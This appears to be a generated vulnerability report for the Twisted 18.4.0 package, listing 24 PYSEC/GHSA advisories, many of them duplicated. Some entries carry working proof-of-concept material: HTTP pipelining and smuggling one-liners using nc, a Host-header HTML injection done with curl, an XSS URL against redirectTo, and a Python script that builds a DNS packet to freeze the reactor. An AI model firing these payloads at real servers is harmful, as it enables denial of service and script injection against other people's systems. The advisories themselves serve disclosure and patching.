@@ -1,0 +1,639 @@
+package: Twisted (version:twisted/18.4.0)
+vulnerability count: 24
+
+id: PYSEC-2019-128
+aliases: CVE-2019-12387, GHSA-6cc5-2vg4-cc7m
+summary: None
+details: In Twisted before 19.2.1, twisted.web did not validate or sanitize URIs or HTTP methods, allowing an attacker to inject invalid characters such as CRLF.
+vulnerability fixed in versions: 19.2.1
+links: 
+---------------------------
+id: PYSEC-2020-260
+aliases: CVE-2020-10109, GHSA-p5xh-vx83-mxcj
+summary: None
+details: In Twisted Web through 19.10.0, there was an HTTP request splitting vulnerability. When presented with a content-length and a chunked encoding header, the content-length took precedence and the remainder of the request body was interpreted as a pipelined request.
+vulnerability fixed in versions: 20.3.0rc1
+links: 
+---------------------------
+id: PYSEC-2019-129
+aliases: CVE-2019-12855, GHSA-65rm-h285-5cc5
+summary: None
+details: In words.protocols.jabber.xmlstream in Twisted through 19.2.1, XMPP support did not verify certificates when used with TLS, allowing an attacker to MITM connections.
+vulnerability fixed in versions: 19.7.0rc1
+links: 
+---------------------------
+id: PYSEC-2020-259
+aliases: CVE-2020-10108, GHSA-h96w-mmrf-2h6v
+summary: None
+details: In Twisted Web through 19.10.0, there was an HTTP request splitting vulnerability. When presented with two content-length headers, it ignored the first header. When the second content-length value was set to zero, the request body was interpreted as a pipelined request.
+vulnerability fixed in versions: 20.3.0rc1
+links: 
+---------------------------
+id: PYSEC-2022-27
+aliases: CVE-2022-21712, GHSA-92x2-jw7w-xvvx
+summary: None
+details: twisted is an event-driven networking engine written in Python. In affected versions twisted exposes cookies and authorization headers when following cross-origin redirects. This issue is present in the `twited.web.RedirectAgent` and `twisted.web. BrowserLikeRedirectAgent` functions. Users are advised to upgrade. There are no known workarounds.
+vulnerability fixed in versions: 22.1.0
+links: 
+---------------------------
+id: PYSEC-2022-195
+aliases: CVE-2022-24801, GHSA-c2jg-hw38-jrqq
+summary: None
+details: Twisted is an event-based framework for internet applications, supporting Python 3.6+. Prior to version 22.4.0rc1, the Twisted Web HTTP 1.1 server, located in the `twisted.web.http` module, parsed several HTTP request constructs more leniently than permitted by RFC 7230. This non-conformant parsing can lead to desync if requests pass through multiple HTTP parsers, potentially resulting in HTTP request smuggling. Users who may be affected use Twisted Web's HTTP 1.1 server and/or proxy and also pass requests through a different HTTP server and/or proxy. The Twisted Web client is not affected. The HTTP 2.0 server uses a different parser, so it is not affected. The issue has been addressed in Twisted 22.4.0rc1. Two workarounds are available: Ensure any vulnerabilities in upstream proxies have been addressed, such as by upgrading them; or filter malformed requests by other means, such as configuration of an upstream proxy.
+vulnerability fixed in versions: 22.4.0
+links: 
+---------------------------
+id: GHSA-c2jg-hw38-jrqq
+aliases: CVE-2022-24801, PYSEC-2022-195
+summary: None
+details: The Twisted Web HTTP 1.1 server, located in the `twisted.web.http` module, parsed several HTTP request constructs more leniently than permitted by RFC 7230:
+
+1. The Content-Length header value could have a `+` or `-` prefix.
+2. Illegal characters were permitted in chunked extensions, such as the LF (`\n`) character.
+3. Chunk lengths, which are expressed in hexadecimal format, could have a prefix of `0x`.
+4. HTTP headers were stripped of all leading and trailing ASCII whitespace, rather than only space and HTAB (`\t`).
+
+This non-conformant parsing can lead to desync if requests pass through multiple HTTP parsers, potentially resulting in HTTP request smuggling.
+
+### Impact
+
+You may be affected if:
+
+1. You use Twisted Web's HTTP 1.1 server and/or proxy
+2. You also pass requests through a different HTTP server and/or proxy
+
+The specifics of the other HTTP parser matter. The original report notes that some versions of Apache Traffic Server and HAProxy have been vulnerable in the past. HTTP request smuggling may be a serious concern if you use a proxy to perform request validation or access control.
+
+The Twisted Web client is not affected. The HTTP 2.0 server uses a different parser, so it is not affected.
+
+### Patches
+
+The issue has been addressed in Twisted 22.4.0rc1 and later.
+
+### Workarounds
+
+Other than upgrading Twisted, you could:
+
+* Ensure any vulnerabilities in upstream proxies have been addressed, such as by upgrading them
+* Filter malformed requests by other means, such as configuration of an upstream proxy
+
+### Credits
+
+This issue was initially reported by [Zhang Zeyu](https://github.com/zeyu2001).
+vulnerability fixed in versions: 22.4.0
+links: 
+---------------------------
+id: GHSA-p5xh-vx83-mxcj
+aliases: CVE-2020-10109, PYSEC-2020-260
+summary: None
+details: In Twisted Web through 20.3.0, there was an HTTP request splitting vulnerability. When presented with a content-length and a chunked encoding header, the content-length took precedence and the remainder of the request body was interpreted as a pipelined request.
+vulnerability fixed in versions: 20.3.0
+links: 
+---------------------------
+id: GHSA-32gv-6cf3-wcmq
+aliases: 
+summary: None
+details: ### Impact
+Twisted web servers that utilize the optional HTTP/2 support suffer from the following flow-control related vulnerabilities:
+
+Ping flood: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9512
+Reset flood: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9514
+Settings flood: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9515
+
+A Twisted web server supports HTTP/2 requests if you've installed the [`http2` optional dependency set](https://twistedmatrix.com/documents/19.2.0/installation/howto/optional.html).
+
+### Workarounds
+There are no workarounds.
+
+### References
+https://github.com/Netflix/security-bulletins/blob/master/advisories/third-party/2019-002.md
+
+### For more information
+If you have any questions or comments about this advisory:
+* Open an issue in [Twisted's Trac](https://twistedmatrix.com/trac/)
+
+vulnerability fixed in versions: 19.10.0
+links: 
+---------------------------
+id: GHSA-65rm-h285-5cc5
+aliases: CVE-2019-12855, PYSEC-2019-129
+summary: None
+details: In words.protocols.jabber.xmlstream in Twisted through 19.2.1, XMPP support did not verify certificates when used with TLS, allowing an attacker to MITM connections.
+vulnerability fixed in versions: 19.7.0rc1
+links: 
+---------------------------
+id: GHSA-h96w-mmrf-2h6v
+aliases: CVE-2020-10108, PYSEC-2020-259
+summary: None
+details: In Twisted Web before 20.3.0, there was an HTTP request splitting vulnerability. When presented with two content-length headers, it ignored the first header. When the second content-length value was set to zero, the request body was interpreted as a pipelined request.
+vulnerability fixed in versions: 20.3.0
+links: 
+---------------------------
+id: GHSA-6cc5-2vg4-cc7m
+aliases: CVE-2019-12387, PYSEC-2019-128
+summary: None
+details: In Twisted before 19.2.1, twisted.web did not validate or sanitize URIs or HTTP methods, allowing an attacker to inject invalid characters such as CRLF.
+vulnerability fixed in versions: 19.2.1
+links: 
+---------------------------
+id: GHSA-92x2-jw7w-xvvx
+aliases: CVE-2022-21712, PYSEC-2022-27
+summary: None
+details: ### Impact
+
+Cookie and Authorization headers are leaked when following cross-origin redirects in `twited.web.client.RedirectAgent` and `twisted.web.client.BrowserLikeRedirectAgent`.
+vulnerability fixed in versions: 22.1.0
+links: 
+---------------------------
+id: GHSA-8r99-h8j2-rw64
+aliases: 
+summary: None
+details: ### Impact
+Twisted Web is vulnerable to request smuggling attacks:
+
+1. "When presented with two content-length headers, Twisted Web ignored the first header. When the second content-length was set to zero this caused Twisted Web to interpret the request body as a pipelined request. According to RFC 7230 Section 3.3.3#4, if a message is received with multiple content-length headers with differing value, then the server must reject the message with a 400 response." (Jake Miller of Bishop Fox Security)
+2. " When presented with a content-length and a chunked encoding header, the content-length took precedence and the remainder of the request body was interpreted by Twisted Web as a pipelined request. According to RFC 7230 Section 3.3.3#3, if a message with both content-length and chunked encoding is accepted, transfer-encoding overrides the content-length." (Jake Miller of Bishop Fox Security)
+3. ~"Twisted should not allow BWS between the filed-name and colon." (ZeddYu Lu)~ _closed in 9646_
+4. "Two CL header with different values is also not allowed." (ZeddYu Lu)
+5. "Only accept identity and chunked Transport-Encoding." (ZeddYu Lu)
+
+### Patches
+https://github.com/twisted/twisted/commit/20c787a14a09e7cbd5dfd8df08ceff00d1fcc081
+https://github.com/twisted/twisted/commit/4a7d22e490bb8ff836892cc99a1f54b85ccb0281
+
+### Workarounds
+N/A
+
+### References
+https://portswigger.net/web-security/request-smuggling
+
+vulnerability fixed in versions: 20.3.0
+links: 
+---------------------------
+id: GHSA-vg46-2rrj-3647
+aliases: CVE-2022-39348, PYSEC-2026-1055
+summary: None
+details: When the host header does not match a configured host, `twisted.web.vhost.NameVirtualHost` will return a `NoResource` resource which renders the Host header unescaped into the 404 response allowing HTML and script injection.
+
+Example configuration:
+```python
+from twisted.web.server import Site
+from twisted.web.vhost import NameVirtualHost
+from twisted.internet import reactor
+
+resource = NameVirtualHost()
+site = Site(resource)
+reactor.listenTCP(8080, site)
+reactor.run()
+```
+Output:
+```
+❯ curl -H"Host:<h1>HELLO THERE</h1>" http://localhost:8080/
+
+<html>
+  <head><title>404 - No Such Resource</title></head>
+  <body>
+    <h1>No Such Resource</h1>
+    <p>host b'<h1>hello there</h1>' not in vhost map</p>
+  </body>
+</html>
+```
+
+This vulnerability was introduced in f49041bb67792506d85aeda9cf6157e92f8048f4 and first appeared in the 0.9.4 release.
+vulnerability fixed in versions: 22.10.0rc1
+links: 
+---------------------------
+id: GHSA-xc8x-vp79-p3wm
+aliases: CVE-2023-46137, PYSEC-2023-224
+summary: None
+details: Twisted is an event-based framework for internet applications. Prior to version 23.10.0rc1, when sending multiple HTTP requests in one TCP packet, twisted.web will process the requests asynchronously without guaranteeing the response order. If one of the endpoints is controlled by an attacker, the attacker can delay the response on purpose to manipulate the response of the second request when a victim launched two requests using HTTP pipeline. Version 23.10.0rc1 contains a patch for this issue.
+
+### Details
+There's an example faulty program:
+```python
+from twisted.internet import reactor, endpoints
+from twisted.web import server
+from twisted.web.proxy import ReverseProxyResource
+from twisted.web.resource import Resource
+
+class Second(Resource):
+    isLeaf = True
+    def render_GET(self, request):
+        return b'SECOND\n'
+
+class First(Resource):
+    isLeaf = True
+    def render_GET(self, request):
+        def send_response():
+            request.write(b'FIRST DELAYED\n')
+            request.finish()
+        reactor.callLater(0.5, send_response)
+        return server.NOT_DONE_YET
+
+root = Resource()
+
+root.putChild(b'second', Second())
+root.putChild(b'first', First())
+
+endpoint = endpoints.TCP4ServerEndpoint(reactor, 8080)
+endpoint.listen(server.Site(root))
+reactor.run()
+```
+
+When two requests for `/first` and `/second` are sent in the same order, the second request will be responded to first.
+```shell
+echo -en "GET /first HTTP/1.1\r\nHost: a\r\n\r\nGET /second HTTP/1.1\r\nHost: a\r\n\r\n" | nc localhost 8080
+```
+vulnerability fixed in versions: 23.10.0rc1
+links: 
+---------------------------
+id: PYSEC-2023-224
+aliases: CVE-2023-46137, GHSA-xc8x-vp79-p3wm
+summary: None
+details: Twisted is an event-based framework for internet applications. Prior to version 23.10.0rc1, when sending multiple HTTP requests in one TCP packet, twisted.web will process the requests asynchronously without guaranteeing the response order. If one of the endpoints is controlled by an attacker, the attacker can delay the response on purpose to manipulate the response of the second request when a victim launched two requests using HTTP pipeline. Version 23.10.0rc1 contains a patch for this issue.
+vulnerability fixed in versions: 23.10.0rc1
+links: 
+---------------------------
+id: PYSEC-2024-75
+aliases: CVE-2024-41810, GHSA-cf56-g6w6-pqq2
+summary: None
+details: Twisted is an event-based framework for internet applications, supporting Python 3.6+. The `twisted.web.util.redirectTo` function contains an HTML injection vulnerability. If application code allows an attacker to control the redirect URL this vulnerability may result in Reflected Cross-Site Scripting (XSS) in the redirect response HTML body. This vulnerability is fixed in 24.7.0rc1.
+vulnerability fixed in versions: 24.7.0rc1
+links: 
+---------------------------
+id: GHSA-c8m8-j448-xjx7
+aliases: CVE-2024-41671, PYSEC-2026-1992
+summary: None
+details: ### Summary
+
+The HTTP 1.0 and 1.1 server provided by twisted.web could process pipelined HTTP requests out-of-order, possibly resulting in information disclosure.
+
+### PoC
+0. Start a fresh Debian container:
+```sh
+docker run --workdir /repro --rm -it debian:bookworm-slim
+```
+1. Install twisted and its dependencies:
+```sh
+apt -y update && apt -y install ncat git python3 python3-pip \
+    && git clone --recurse-submodules https://github.com/twisted/twisted \
+    && cd twisted \
+    && pip3 install --break-system-packages .
+```
+2. Run a twisted.web HTTP server that echos received requests' methods. e.g., the following:
+```python
+from twisted.web import server, resource
+from twisted.internet import reactor
+
+class TheResource(resource.Resource):
+    isLeaf = True
+
+    def render_GET(self, request) -> bytes:
+        return b"GET"
+
+    def render_POST(self, request) -> bytes:
+        return b"POST"
+
+site = server.Site(TheResource())
+reactor.listenTCP(80, site)
+reactor.run()
+```
+3. Send it a POST request with a chunked message body, pipelined with another POST request, wait a second, then send a GET request on the same connection:
+```sh
+(printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n'; sleep 1; printf 'GET / HTTP/1.1\r\n\r\n'; sleep 1) | nc localhost 80
+```
+4. Observe that the responses arrive out of order:
+```
+HTTP/1.1 200 OK
+Server: TwistedWeb/24.3.0.post0
+Date: Tue, 09 Jul 2024 06:19:41 GMT
+Content-Length: 5
+Content-Type: text/html
+
+POST
+HTTP/1.1 200 OK
+Server: TwistedWeb/24.3.0.post0
+Date: Tue, 09 Jul 2024 06:19:42 GMT
+Content-Length: 4
+Content-Type: text/html
+
+GET
+HTTP/1.1 200 OK
+Server: TwistedWeb/24.3.0.post0
+Date: Tue, 09 Jul 2024 06:19:42 GMT
+Content-Length: 5
+Content-Type: text/html
+
+POST
+```
+
+### Impact
+See [GHSA-xc8x-vp79-p3wm](https://github.com/twisted/twisted/security/advisories/GHSA-xc8x-vp79-p3wm). Further, for instances of twisted.web HTTP servers deployed behind reverse proxies that implement connection pooling, it may be possible for remote attackers to receive responses intended for other clients of the twisted.web server.
+vulnerability fixed in versions: 24.7.0rc1
+links: 
+---------------------------
+id: GHSA-cf56-g6w6-pqq2
+aliases: CVE-2024-41810, PYSEC-2024-75
+summary: None
+details: ### Summary
+
+The `twisted.web.util.redirectTo` function contains an HTML injection vulnerability. If application code allows an attacker to control the redirect URL this vulnerability may result in Reflected Cross-Site Scripting (XSS) in the redirect response HTML body.
+
+### Details
+Twisted’s `redirectTo` function generates an `HTTP 302 Redirect` response. The response contains an HTML body, built for exceptional cases where the browser doesn’t properly handle the redirect, allowing the user to click a link, navigating them to the specified destination.
+
+The function reflects the destination URL in the HTML body without any output encoding. 
+```python
+# https://github.com/twisted/twisted/blob/trunk/src/twisted/web/_template_util.py#L88
+def redirectTo(URL: bytes, request: IRequest) -> bytes:
+    # ---snip---
+    content = b"""
+<html>
+    <head>
+        <meta http-equiv=\"refresh\" content=\"0;URL=%(url)s\">
+    </head>
+    <body bgcolor=\"#FFFFFF\" text=\"#000000\">
+    <a href=\"%(url)s\">click here</a>
+    </body>
+</html>
+""" % {
+        b"url": URL
+    }
+    return content
+```
+
+If an attacker has full or partial control over redirect location due to an application bug, also known as an “Open Redirect”, they may inject arbitrary HTML into the response’s body, ultimately leading to an XSS attack.
+
+It’s worth noting that the issue is known to maintainers and tracked with GitHub [Issue#9839](https://github.com/twisted/twisted/issues/9839). The issue description, however, does not make any mention of exploitability and simply states: “…Browsers don't seem to actually render that page…”
+
+### PoC
+The issue can be reproduced by running the following Twisted-based HTTP server locally:
+```python
+from twisted.web import server, resource
+from twisted.internet import reactor
+from twisted.web.util import redirectTo
+
+class Simple(resource.Resource):
+    isLeaf = True
+    def render_GET(self, request):
+        url = request.args[b'url'][0]  # <-- open redirect
+        return redirectTo(url, request)
+
+site = server.Site(Simple())
+reactor.listenTCP(9009, site)
+reactor.run()
+```
+Once running, navigate to the following URL: `http://127.0.0.1:9009?url=ws://example.com/"><script>alert(document.location)</script>`, and verify that the “alert” dialog was displayed.
+
+**Note**: Due to the different ways browsers validate the redirect Location header, this attack is possible only in **Firefox**. All other tested browsers will display an error message to the user and will not render the HTML body.
+
+### Impact
+If successfully exploited, the issue will allow malicious JavaScript to run in the context of the victim's session. This will in turn lead to unauthorized access/modification to victim's account and information associated with it, or allow for unauthorized operations to be performed within the context of the victim's session.
+vulnerability fixed in versions: 24.7.0rc1
+links: 
+---------------------------
+id: PYSEC-2026-160
+aliases: CVE-2026-42304, GHSA-grgv-6hw6-v9g4
+summary: None
+details: Twisted is an event-based framework for internet applications, supporting Python 3.6+. Prior to 26.4.0rc2, the twisted.names module is vulnerable to a Denial of Service (DoS) attack via resource exhaustion during DNS name decompression. A remote, unauthenticated attacker can exploit this by sending a crafted TCP DNS packet containing deeply chained compression pointers. This flaw bypasses previous loop-prevention logic, causing the single-threaded Twisted reactor to hang while processing millions of recursive lookups, effectively freezing the server. This vulnerability is fixed in 26.4.0rc2.
+vulnerability fixed in versions: 26.4.0
+links: 
+---------------------------
+id: GHSA-grgv-6hw6-v9g4
+aliases: CVE-2026-42304, PYSEC-2026-160
+summary: None
+details: ### Details
+
+The twisted.names module is vulnerable to a Denial of Service (DoS) attack via resource exhaustion during DNS name decompression. A remote, unauthenticated attacker can exploit this by sending a crafted TCP DNS packet containing deeply chained compression pointers. This flaw bypasses previous loop-prevention logic, causing the single-threaded Twisted reactor to hang while processing millions of recursive lookups, effectively freezing the server.
+
+---
+
+### Technical Details
+
+The main issue is in twisted.names.dns.Name.decode. A visited set was added in 2011 (commit e11cd82) to prevent infinite loops, but there is still no limit on the number of pointer dereferences per message. Also, the visited set is reset for each Question record.
+
+Because DNSServerFactory handles every record in QDCOUNT without checking them, an attacker can add thousands of questions that all refer to the same long chain of pointers. This makes the parser repeat a complex and unnecessary search.
+
+```python
+##  src/twisted/names/dns.py (Lines 595-631)
+
+def decode(self, strio, length=None):
+        visited = set()
+        self.name = b""
+        off = 0
+        while 1:
+            l = ord(readPrecisely(strio, 1))
+            if l == 0:
+                if off > 0:
+                    strio.seek(off)
+                return
+            if (l >> 6) == 3:
+                new_off = (l & 63) << 8 | ord(readPrecisely(strio, 1))
+                if new_off in visited:
+                    raise ValueError("Compression loop in encoded name")
+                visited.add(new_off)
+                if off == 0:
+                    off = strio.tell()
+                strio.seek(new_off)
+                continue
+            label = readPrecisely(strio, l)
+            if self.name == b"":
+                self.name = label
+            else:
+                self.name = self.name + b"." + label
+
+```
+
+---
+
+### PoC
+
+```python
+import struct, time
+from twisted.names import dns, server
+from twisted.test import proto_helpers
+
+def create_tcp_payload():
+    num_pointers = 8000
+    packet_length = 65533
+    num_questions = (packet_length - (num_pointers * 2) - 12) // 6
+
+    buffer = bytearray(packet_length)
+
+    struct.pack_into("!HHHHHH", buffer, 0, 1, 0, num_questions, 0, 0, 0)
+
+    ptr_offset = 12
+    for _ in range(num_pointers - 1):
+        struct.pack_into("!H", buffer, ptr_offset, 0xC000 | (ptr_offset + 2))
+        ptr_offset += 2
+
+    null_byte_offset = ptr_offset + 2
+    struct.pack_into("!H", buffer, ptr_offset, 0xC000 | null_byte_offset)
+    buffer[null_byte_offset] = 0
+
+    question_offset = null_byte_offset + 1
+    for _ in range(num_questions):
+        if question_offset + 6 <= packet_length:
+            struct.pack_into("!HHH", buffer, question_offset, 0xC000 | 12, 1, 1)
+            question_offset += 6
+
+    return packet_length, num_pointers, num_questions, struct.pack("!H", packet_length) + buffer
+
+def test_dns_server():
+    factory = server.DNSServerFactory(clients=[])
+    protocol = factory.buildProtocol(("127.0.0.1", 10053))
+    transport = proto_helpers.StringTransport()
+    protocol.makeConnection(transport)
+
+    pkt_len, num_ptrs, num_qs, payload = create_tcp_payload()
+    print("payload")
+    print(f"len={pkt_len} ptrs={num_ptrs} qs={num_qs}")
+
+    start = time.time()
+    protocol.dataReceived(payload)
+    end = time.time()
+
+    print(f"time={end - start:.4f}s")
+
+if __name__ == "__main__":
+    test_dns_server()
+```
+
+---
+
+### Impact
+
+A single malformed TCP packet is sufficient to block the Twisted reactor's event loop for several seconds. Because Twisted operates on a single-threaded cooperative multitasking model, this is a common Denial of Service (DoS). The process becomes unable to handle new connections, process I/O, or respond to existing requests, effectively paralyzing the server for the duration of the decompression.
+
+---
+
+### Remediation
+
+- Update twisted.names.dns.Name.decode to add a required limit on pointer resolutions per DNS message
+- Share the "resolved offset" state across all records in a single message to prevent redundant processing.
+- Validate the number of questions before entering the decoding loop in Message.decode.
+
+---
+
+### Resources
+
+https://cwe.mitre.org/data/definitions/400.html
+
+https://cwe.mitre.org/data/definitions/407.html
+
+https://datatracker.ietf.org/doc/html/rfc9267
+
+https://github.com/twisted/twisted/blob/trunk/src/twisted/names/dns.py#L595
+
+https://github.com/twisted/twisted/commit/e11cd82bdd79b3ebbb0e8635cbb9c76df2b5af09
+
+---
+
+**Author**: Tomas Illuminati
+vulnerability fixed in versions: 26.4.0rc2
+links: 
+---------------------------
+id: PYSEC-2026-1055
+aliases: CVE-2022-39348, GHSA-vg46-2rrj-3647
+summary: None
+details: When the host header does not match a configured host, `twisted.web.vhost.NameVirtualHost` will return a `NoResource` resource which renders the Host header unescaped into the 404 response allowing HTML and script injection.
+
+Example configuration:
+```python
+from twisted.web.server import Site
+from twisted.web.vhost import NameVirtualHost
+from twisted.internet import reactor
+
+resource = NameVirtualHost()
+site = Site(resource)
+reactor.listenTCP(8080, site)
+reactor.run()
+```
+Output:
+```
+❯ curl -H"Host:<h1>HELLO THERE</h1>" http://localhost:8080/
+
+<html>
+  <head><title>404 - No Such Resource</title></head>
+  <body>
+    <h1>No Such Resource</h1>
+    <p>host b'<h1>hello there</h1>' not in vhost map</p>
+  </body>
+</html>
+```
+
+This vulnerability was introduced in f49041bb67792506d85aeda9cf6157e92f8048f4 and first appeared in the 0.9.4 release.
+vulnerability fixed in versions: 22.10.0rc1
+links: 
+---------------------------
+id: PYSEC-2026-1992
+aliases: CVE-2024-41671, GHSA-c8m8-j448-xjx7
+summary: None
+details: ### Summary
+
+The HTTP 1.0 and 1.1 server provided by twisted.web could process pipelined HTTP requests out-of-order, possibly resulting in information disclosure.
+
+### PoC
+0. Start a fresh Debian container:
+```sh
+docker run --workdir /repro --rm -it debian:bookworm-slim
+```
+1. Install twisted and its dependencies:
+```sh
+apt -y update && apt -y install ncat git python3 python3-pip \
+    && git clone --recurse-submodules https://github.com/twisted/twisted \
+    && cd twisted \
+    && pip3 install --break-system-packages .
+```
+2. Run a twisted.web HTTP server that echos received requests' methods. e.g., the following:
+```python
+from twisted.web import server, resource
+from twisted.internet import reactor
+
+class TheResource(resource.Resource):
+    isLeaf = True
+
+    def render_GET(self, request) -> bytes:
+        return b"GET"
+
+    def render_POST(self, request) -> bytes:
+        return b"POST"
+
+site = server.Site(TheResource())
+reactor.listenTCP(80, site)
+reactor.run()
+```
+3. Send it a POST request with a chunked message body, pipelined with another POST request, wait a second, then send a GET request on the same connection:
+```sh
+(printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n'; sleep 1; printf 'GET / HTTP/1.1\r\n\r\n'; sleep 1) | nc localhost 80
+```
+4. Observe that the responses arrive out of order:
+```
+HTTP/1.1 200 OK
+Server: TwistedWeb/24.3.0.post0
+Date: Tue, 09 Jul 2024 06:19:41 GMT
+Content-Length: 5
+Content-Type: text/html
+
+POST
+HTTP/1.1 200 OK
+Server: TwistedWeb/24.3.0.post0
+Date: Tue, 09 Jul 2024 06:19:42 GMT
+Content-Length: 4
+Content-Type: text/html
+
+GET
+HTTP/1.1 200 OK
+Server: TwistedWeb/24.3.0.post0
+Date: Tue, 09 Jul 2024 06:19:42 GMT
+Content-Length: 5
+Content-Type: text/html
+
+POST
+```
+
+### Impact
+See [GHSA-xc8x-vp79-p3wm](https://github.com/twisted/twisted/security/advisories/GHSA-xc8x-vp79-p3wm). Further, for instances of twisted.web HTTP servers deployed behind reverse proxies that implement connection pooling, it may be possible for remote attackers to receive responses intended for other clients of the twisted.web server.
+vulnerability fixed in versions: 24.7.0rc1
+links: 
+---------------------------
